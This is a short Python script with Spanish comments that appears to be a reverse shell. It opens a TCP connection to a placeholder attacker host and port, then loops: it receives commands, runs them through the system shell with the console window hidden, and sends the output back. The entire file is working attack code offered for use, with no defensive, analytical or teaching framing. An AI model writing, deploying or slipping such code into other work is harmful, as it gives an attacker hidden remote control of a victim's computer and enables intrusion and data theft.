import socket
import subprocess
import platform

def main():
    HOST = 'IP'
    PORT = PORT

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # Ejecutar el comando shell (cmd.exe en Windows)
    if platform.system() == "Windows":
        creation_flags = subprocess.CREATE_NEW_CONSOLE | subprocess.CREATE_NO_WINDOW
    else:
        creation_flags = 0

    process = subprocess.Popen(["cmd.exe"], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=creation_flags)

    # Redirigir la entrada estándar, salida estándar y error estándar a la conexión TCP
    stdin, stdout, stderr = process.stdin, process.stdout, process.stderr

    # Enviar la salida estándar y error estándar al cliente a través de la conexión TCP
    while True:
        command = s.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break

        # Ejecutar el comando y enviar la salida de nuevo al cliente
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=creation_flags)
        s.send(output.stdout + output.stderr)

    s.close()

if __name__ == "__main__":
    main()
 
